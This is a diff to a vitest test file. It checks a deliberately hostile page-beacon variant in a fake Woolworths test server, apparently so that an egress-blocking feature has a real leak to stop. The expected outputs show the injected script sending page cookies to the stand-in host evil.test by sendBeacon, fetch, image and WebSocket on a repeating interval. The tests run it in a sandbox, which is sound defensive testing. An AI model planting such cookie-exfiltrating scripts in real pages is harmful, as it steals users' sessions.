@@ -1,8 +1,9 @@
 // The hostile page-script variant: on only when the harness asks, on www pages only, and its
 // settings are checked before they go into a page.
 
+import { Script } from 'node:vm'
 import { afterEach, describe, expect, it } from 'vitest'
-import { DEFAULT_BEACON_INTERVAL_MS, validBeacon } from '../src/beacon'
+import { BEACON_ROUNDS_ATTRIBUTE, beaconScript, DEFAULT_BEACON_INTERVAL_MS, validBeacon } from '../src/beacon'
 import { type FakeWoolworths, startFakeWoolworths } from '../src/server'
 import { Client, sensorValueIn } from './support/client'
 
@@ -20,6 +21,53 @@ async function start(options: Parameters<typeof startFakeWoolworths>[0] = {}): P
 const TARGET = { host: 'evil.test', port: 4711 }
 const TAG = '<script id="page-beacon">'
 
+/** The body of the page's beacon tag, as a browser would run it. */
+function bodyOf(page: string): string {
+  const match = /<script id="page-beacon">([\s\S]*?)<\/script>/.exec(page)
+  if (match?.[1] === undefined) throw new Error('no beacon in the page')
+  return match[1]
+}
+
+/**
+ * Runs the beacon in a sandbox whose browser APIs only record what they were asked to send, so
+ * nothing leaves the machine. Returns what each route was given and the page's round counter.
+ */
+function runBeacon(body: string, cookie: string) {
+  const sent: string[] = []
+  const ticks: (() => void)[] = []
+  const dataset: { beaconRounds?: string } = {}
+  const context = {
+    document: { cookie, documentElement: { dataset } },
+    navigator: {
+      sendBeacon: (url: string, data: string) => {
+        sent.push(`sendBeacon ${url} ${data}`)
+        return true
+      },
+    },
+    fetch: (url: string, init?: { method?: string; body?: string }) => {
+      sent.push(`fetch ${init?.method ?? 'GET'} ${url}${init?.body === undefined ? '' : ` ${init.body}`}`)
+      return Promise.resolve()
+    },
+    Image: class {
+      set src(url: string) {
+        sent.push(`img ${url}`)
+      }
+    },
+    WebSocket: class {
+      onerror: unknown = null
+      constructor(url: string) {
+        sent.push(`ws ${url}`)
+      }
+    },
+    setInterval: (tick: () => void, ms: number) => {
+      sent.push(`every ${ms}`)
+      ticks.push(tick)
+    },
+  }
+  new Script(body).runInNewContext(context)
+  return { sent, ticks, rounds: () => dataset.beaconRounds }
+}
+
 describe('the page beacon variant', () => {
   it('is off by default', async () => {
     const site = await start()
@@ -36,6 +84,49 @@ describe('the page beacon variant', () => {
       // The adapter e2e reads the sensor value from the page; the beacon must not disturb that.
       expect(sensorValueIn(page.text)).not.toBeNull()
     }
+  })
+
+  it('is a script that parses, fires at once and then every interval, by every route', async () => {
+    const site = await start({ hostile: { pageBeacon: TARGET } })
+    const body = bodyOf((await new Client(site.origin).get('/')).text)
+    // A syntax error would leave the desktop's egress spec passing with nothing to stop.
+    expect(() => new Script(body)).not.toThrow()
+    const beacon = runBeacon(body, 'wow-session=abc; _abck=xyz')
+    const leak = encodeURIComponent('wow-session=abc; _abck=xyz')
+    const round = [
+      `sendBeacon http://evil.test:4711/beacon?c=${leak} ${leak}`,
+      `fetch POST http://evil.test:4711/beacon?c=${leak} ${leak}`,
+      `fetch GET https://evil.test:4711/beacon?c=${leak}`,
+      `img http://evil.test:4711/beacon?c=${leak}&img=1`,
+      `ws ws://evil.test:4711/ws?c=${leak}`,
+    ]
+    expect(beacon.sent).toEqual([...round, 'every 200'])
+    expect(beacon.rounds()).toBe('1')
+    beacon.ticks[0]?.()
+    expect(beacon.sent).toEqual([...round, 'every 200', ...round])
+    expect(beacon.rounds()).toBe('2')
+  })
+
+  it('counts its rounds on <html> even when every route throws, and sends no-cookie for an empty jar', () => {
+    const body = bodyOf(beaconScript(TARGET))
+    const dataset: { beaconRounds?: string } = {}
+    const refuse = () => {
+      throw new Error('blocked')
+    }
+    const ticks: (() => void)[] = []
+    new Script(body).runInNewContext({
+      document: { cookie: '', documentElement: { dataset } },
+      navigator: { sendBeacon: refuse },
+      fetch: refuse,
+      Image: refuse,
+      WebSocket: refuse,
+      setInterval: (tick: () => void) => ticks.push(tick),
+    })
+    ticks[0]?.()
+    ticks[0]?.()
+    expect(dataset.beaconRounds).toBe('3')
+    expect(BEACON_ROUNDS_ATTRIBUTE).toBe('data-beacon-rounds')
+    expect(runBeacon(body, '').sent[0]).toBe('sendBeacon http://evil.test:4711/beacon?c=no-cookie no-cookie')
   })
 
   it('uses the interval it is given', async () => {
